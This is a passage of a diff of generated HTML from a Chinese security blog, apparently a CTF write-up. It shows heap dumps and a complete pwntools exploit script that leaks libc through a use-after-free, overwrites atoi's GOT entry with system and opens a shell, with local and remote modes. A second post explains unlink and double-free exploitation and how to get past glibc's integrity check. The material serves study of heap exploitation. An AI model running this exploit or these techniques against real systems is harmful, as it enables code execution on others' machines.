0x4343434343434343</span><br><span class="line">0x604190:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x6041a0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x6041b0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x6041c0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x6041d0:	0x00000000000000b0	0x0000000000000020 &lt;-- player 3 [free]</span><br><span class="line">0x6041e0:	0x0000000000000000	0x0000000400000003</span><br><span class="line">0x6041f0:	0x0000000000604200	0x0000000000020e11 &lt;-- top chunk</span><br><span class="line"></span><br><span class="line">Malloc不喜欢碎片，所以它做的是整合任何相邻的空闲块，根据它们的合并大小更新这些块的大小值，</span><br><span class="line">最后将顶块的大小值更新为更高的块，因为块是free的，并且意味着要分配更多的可用空间。</span><br><span class="line"></span><br><span class="line">(0x20)     fastbin[0]: 0x6041d0 --&gt; 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">                  top: 0x6041f0 (size : 0x20e10) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x604120 (size : 0xb0)</span><br><span class="line"></span><br><span class="line">  这个地方不是很懂，感觉就是扩大了top chunk的size，可是有什么用</span><br><span class="line"></span><br><span class="line">现在考虑以下内容。下次分配会发生什么？</span><br><span class="line"></span><br><span class="line">请记住，每个player对象的默认大小为0x20，指针指向任意大小的块，具体取决于输入的长度。</span><br><span class="line"></span><br><span class="line">当我们分配一个新块时，malloc将根据大小请求检查相应的bin列表，并检查是否有相同大小的等效空闲块以回馈给用户。这就是所谓的首次适应行为。请记住，快速列表中的删除和添加发生在列表的HEAD中。换句话说，我们应该期待玩家的信息被存储，0x6041d0因为它是一个free的fastbin大小并满足0x20要求。</span><br><span class="line"></span><br><span class="line">未分类的bin保存地址0x604120。这是玩家2的大块地址。这与free（3）之前的地址不同。那是因为malloc整合了相邻的空闲块，并且它们变成了一个完整的空闲块，因此它必须更新地址。与邻接检查对应的代码如下：</span><br><span class="line"></span><br><span class="line">/ *向后巩固* /</span><br><span class="line"> <span class="keyword">if</span>（！prev_inuse（p））&#123;</span><br><span class="line">      prevsize = p-&gt; prev_size ;</span><br><span class="line">      size + = prevsize;</span><br><span class="line">      p = chunk_at_offset（p， - （（long）prevsize））;</span><br><span class="line">      unlink（av，p，bck，fwd）;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">前面free了player2，3的地址，然后被malloc整合成一个大的chunk</span><br><span class="line"></span><br><span class="line">无论我们输入的名称大小（只要它不大于当前未分类的bin列表中的块，0xb0在我们的例子中），我们应该返回地址0x604120以存储名称。如果大小小于0xb0，那么给定的块将被分割，因为没有必要回馈超过我们要求的数量，对吧？</span><br><span class="line"></span><br><span class="line">但是，0x604120是player2的大块地址！这意味着，我们可以使用的名称有效载荷覆盖其数据并混淆其结构。请记住，player2仍然在选定的变量中，因此我们仍然可以打印其内容，编辑它等。如果我们能够使用我们选择的指针（GOT条目）覆盖指向原始名称的指针并调用edit它的功能呢？我们可以重定向代码执行。这是一个abritrary写原语！</span><br><span class="line"></span><br><span class="line"><span class="comment"># Overwrite 3rd player's (index 2) name pointer with atoi</span></span><br><span class="line"><span class="comment"># in order to edit it with system's address</span></span><br><span class="line">alloc(<span class="string">'Z'</span>*8 * 2 + p64(atoi_got))</span><br><span class="line"></span><br><span class="line">edit(p64(system))</span><br><span class="line"></span><br><span class="line">我选择覆盖的函数的GOT条目是atoi。这背后的原因是atoi接收指向我们输入的指针，</span><br><span class="line">以便将其转换回整数。如果atoi是system有关系吗？如果我们提供sh它应该是什么的论据，会发生什么</span><br><span class="line"></span><br><span class="line">0x604120:	0x0000000000000000	0x0000000000000021 &lt;-- new player<span class="string">'s name [old player 2]</span></span><br><span class="line"><span class="string">0x604130:	0x5a5a5a5a5a5a5a5a	0x5a5a5a5a5a5a5a5a</span></span><br><span class="line"><span class="string">0x604140:	0x0000000000603110	0x0000000000000091</span></span><br><span class="line"><span class="string">0x604150:	0x00007ffff7dd37b8	0x00007ffff7dd37b8</span></span><br><span class="line"><span class="string">0x604160:	0x4343434343434343	0x4343434343434343</span></span><br><span class="line"><span class="string">0x604170:	0x4343434343434343	0x4343434343434343</span></span><br><span class="line"><span class="string">0x604180:	0x4343434343434343	0x4343434343434343</span></span><br><span class="line"><span class="string">0x604190:	0x4343434343434343	0x4343434343434343</span></span><br><span class="line"><span class="string">0x6041a0:	0x4343434343434343	0x4343434343434343</span></span><br><span class="line"><span class="string">0x6041b0:	0x4343434343434343	0x4343434343434343</span></span><br><span class="line"><span class="string">0x6041c0:	0x4343434343434343	0x4343434343434343</span></span><br><span class="line"><span class="string">0x6041d0:	0x0000000000000090	0x0000000000000020 &lt;-- new allocated player</span></span><br><span class="line"><span class="string">0x6041e0:	0x0000000200000001	0x0000000400000003</span></span><br><span class="line"><span class="string">0x6041f0:	0x0000000000604130</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">player2的地址已经被atoi的got表所覆盖</span></span><br><span class="line"><span class="string">一旦我们请求编辑其名称，我们将覆盖atoi'</span>s带system<span class="string">'s地址的条目。getshell！</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">atoi_got = 0x603110</span><br><span class="line"></span><br><span class="line">def alloc(name, attack = 1, </span><br><span class="line">		  defense = 2, speed = 3, precision = 4):</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'name: '</span>)</span><br><span class="line">	p.sendline(name)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'points: '</span>)</span><br><span class="line">	p.sendline(str(attack))</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'points: '</span>)</span><br><span class="line">	p.sendline(str(defense))</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'speed: '</span>)</span><br><span class="line">	p.sendline(str(speed))</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'precision: '</span>)</span><br><span class="line">	p.sendline(str(precision))</span><br><span class="line"></span><br><span class="line">	<span class="built_in">return</span></span><br><span class="line"></span><br><span class="line">def edit(name):</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'name: '</span>)</span><br><span class="line">	p.sendline(name)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'sh'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="built_in">return</span></span><br><span class="line"></span><br><span class="line">def select(idx):</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'index: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">	<span class="built_in">return</span></span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'index: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">	<span class="built_in">return</span></span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="built_in">return</span></span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line"></span><br><span class="line">	alloc(<span class="string">'A'</span>*0x60)</span><br><span class="line">	alloc(<span class="string">'B'</span>*0x60)</span><br><span class="line">	alloc(<span class="string">'C'</span>*0x80)</span><br><span class="line">	alloc(<span class="string">'D'</span>*0x80)</span><br><span class="line"></span><br><span class="line">	select(2)</span><br><span class="line"></span><br><span class="line">	free(2)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># The 'selected' array contains the 3rd player object</span></span><br><span class="line">	<span class="comment"># We are abusing the UAF vuln to leak libc</span></span><br><span class="line">	<span class="comment"># show_player just checks if the 'selected' array is empty</span></span><br><span class="line">	<span class="comment"># if it's not, it will print the value of the player's object</span></span><br><span class="line">	<span class="comment"># without checking if it's actually free'd or not</span></span><br><span class="line">	show()</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'Name: '</span>)</span><br><span class="line"></span><br><span class="line">	leak        = u64(p.recv(6).ljust(8, <span class="string">'\x00'</span>))</span><br><span class="line">	libc        = leak - 0x3c17b8</span><br><span class="line">	system      = libc + 0x46590</span><br><span class="line"></span><br><span class="line">	log.info(<span class="string">"Leak:   0x&#123;:x&#125;"</span>.format(leak))</span><br><span class="line">	log.info(<span class="string">"Libc:   0x&#123;:x&#125;"</span>.format(libc))</span><br><span class="line">	log.info(<span class="string">"system: 0x&#123;:x&#125;"</span>.format(system))</span><br><span class="line"></span><br><span class="line">	log.info(<span class="string">"Overwriting atoi with system"</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Consolidate with top chunk</span></span><br><span class="line">	free(3) </span><br><span class="line"></span><br><span class="line">	<span class="comment"># Overwrite 3rd player's (index 2) name pointer with atoi</span></span><br><span class="line">	<span class="comment"># in order to edit it with system's address</span></span><br><span class="line">	alloc(<span class="string">'Z'</span>*8 * 2 + p64(atoi_got))</span><br><span class="line"></span><br><span class="line">	edit(p64(system))</span><br><span class="line"></span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    log.info(<span class="string">"For remote: %s HOST PORT"</span> % sys.argv[0])</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &gt; 1:</span><br><span class="line">        p = remote(sys.argv[1], int(sys.argv[2]))</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = process(<span class="string">'./main.elf'</span>)</span><br><span class="line">        pause()</span><br><span class="line">        pwn()</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/07/double free/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="xfgg">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xfgg">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/08/07/double free/" itemprop="url">Double free</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-07T10:10:17+08:00">
-                2019-08-07
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/百度学习/" itemprop="url" rel="index">
-                    <span itemprop="name">百度学习</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>原文借鉴：<a href="http://d0m021ng.github.io/2017/02/24/PWN/Linux%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BDouble-free/" target="_blank" rel="noopener">http://d0m021ng.github.io/2017/02/24/PWN/Linux%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BDouble-free/</a></p>
-<h3 id="0x01-Glibc背景知识"><a href="#0x01-Glibc背景知识" class="headerlink" title="0x01 Glibc背景知识"></a>0x01 Glibc背景知识</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux下堆分配器主要由两个结构管理堆内存，一种是堆块头部形成的隐式链表，另一种是管理空闲堆块的显式链表（Glibc中的bins数据结构）。关于bins的介绍已经有很多，就不赘述了。接下来介绍一下Linux下Double free漏洞原理以及free函数的堆块合并过程。</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x02-Doublefree漏洞原理"><a href="#0x02-Doublefree漏洞原理" class="headerlink" title="0x02 Doublefree漏洞原理"></a>0x02 Doublefree漏洞原理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> free函数在释放堆块时，会通过隐式链表判断相邻前、后堆块是否为空闲堆块；如果堆块为空闲就会进行合并，然后利用Unlink机制将该空闲堆块从Unsorted bin中取下。如果用户精心构造的假堆块被Unlink，很容易导致一次固定地址写，然后转换为任意地址读写，从而控制程序的执行。</span><br><span class="line"></span><br><span class="line">free函数原理：由堆块头部形成的隐式链表可知，一个需释放堆块相邻的堆块有两个：前一个块（由当前块头指针加pre_size确定），后一个块（由当前块头指针加size确定）。从而，在合并堆块时会存在两种情况：向后合并、向前合并。当前一个块和当前块合并时，叫做向后合并。当后一个块和当前块合并时，叫做向前合并。</span><br><span class="line">相关代码</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x03-Doublefree漏洞利用原理"><a href="#0x03-Doublefree漏洞利用原理" class="headerlink" title="0x03 Doublefree漏洞利用原理"></a>0x03 Doublefree漏洞利用原理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">以64位应用为例：如果在free一个指针指向的块时，由于堆溢出，将后一个块的块头改成如下格式:</span><br><span class="line">fake_prevsize1 = 被释放块大小；</span><br><span class="line">fake_size1 = 0x20 | 1 (fake_size1 = 0x20)</span><br><span class="line">fake_fd = free@got.plt - 0x18</span><br><span class="line">fake_bk = shellcode address</span><br><span class="line">fake_prevsize2 = 0x20</span><br><span class="line">fake_size2 = 0x10</span><br><span class="line">如下图:</span><br><span class="line">如果chunk0被释放(fake_size1 = 0x21)，进行空闲块合并时，1）由于前一个块非空闲，不会向后合并。2）根据chunk2判断后一个块chunk1空闲，向前合并，导致unlink。</span><br><span class="line">如果chunk1被释放(fake_size1 = 0x20)，进行空闲块合并时，1）由于前一个块空闲，向后合并,导致unlink。2）根据chunk2判断后一个块chunk1空闲，向前合并，导致unlink。</span><br><span class="line">根据unlink宏知道， 前一个块 FD 指向 free@got.plt - 0x18, 后一个块 BK 指向 shellcode address。然后前一个块 FD 的bk指针即free@got.plt，值为shellcode address, 后一个块 BK 的 fd 指针即shellcode + 0x10，值为 free@got.plt。从而实现了一次固定地址写。</span><br><span class="line"></span><br><span class="line">High    |----------------|</span><br><span class="line">        |   fake_size2   |</span><br><span class="line">        |----------------|</span><br><span class="line">        | fake_prevsize2 |</span><br><span class="line">        |----------------|  chunk2 pointer</span><br><span class="line">        |    fake_bk     |</span><br><span class="line">        |----------------|</span><br><span class="line">        |    fake_fd     |</span><br><span class="line">        |----------------|  chunk1 malloc returned pointer</span><br><span class="line">        |  fake_size1    |</span><br><span class="line">        |----------------|</span><br><span class="line">        | fake_prevsize1 |</span><br><span class="line">        |----------------|  chunk1 pointer</span><br><span class="line">        |     ......     |</span><br><span class="line">        |    padding     |</span><br><span class="line">        |     ......     |</span><br><span class="line">        |----------------|</span><br><span class="line">        |    fake_bk     |</span><br><span class="line">        |----------------|</span><br><span class="line">        |    fake_fd     |</span><br><span class="line">        |----------------|  chunk0 malloc returned pointer</span><br><span class="line">        |     size       |</span><br><span class="line">        |----------------|</span><br><span class="line">        |   prev_size    |</span><br><span class="line">Low     |----------------|  chunk0 pointer</span><br><span class="line"></span><br><span class="line">但是，由于当前glibc的加固检测机制，会检查显式链表中前一个块的fd与后一个块的bk是否都指向当前需要unlink的块。这样攻击者就无法替换chunk1(或chunk0)的fd与bk。相关代码如下：</span><br><span class="line">如<span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \</span><br><span class="line">   malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV)</span><br><span class="line"></span><br><span class="line">   针对这种情况，需要在内存中找到一个指向需要unlink块的指针，就可以绕过。</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1791,7 +1815,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">37</span>
+                  <span class="site-state-item-count">39</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
